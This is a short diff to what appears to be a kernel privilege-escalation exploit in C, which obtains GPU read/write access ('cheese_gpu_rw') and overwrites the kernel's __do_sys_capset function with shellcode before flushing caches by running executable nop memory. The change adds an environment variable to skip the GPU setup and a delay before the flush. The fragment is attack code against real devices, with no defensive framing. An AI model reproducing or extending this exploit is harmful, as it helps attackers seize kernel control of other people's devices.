@@ -580,10 +580,12 @@ static void stupid_memcpy(void* dst, const void* src, size_t count) {
 int main() {
     g_level1_dcache_size = tu_get_l1_dcache_size();
 #if 1
-    struct cheese_gpu_rw cheese = {};
-    if (cheese_gpu_rw_setup(&cheese)) {
-        fprintf(stderr, "can't get GPU r/w\n");
-        return 1;
+    if (!getenv("CHEESE_SKIP_GPU")) {
+        struct cheese_gpu_rw cheese = {};
+        if (cheese_gpu_rw_setup(&cheese)) {
+            fprintf(stderr, "can't get GPU r/w\n");
+            return 1;
+        }
     }
 #endif
     // now check ksma...
@@ -654,6 +656,7 @@ int main() {
     fprintf(stderr, "patch...\n");
     stupid_memcpy(kernel___do_sys_capset_ptr, shellcode, sizeof(shellcode));
 
+    sleep(1);
     // stupidest cache flush: write and run 16MB of nops.
     {
         void* garbage = mmap(NULL, 0x1000000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
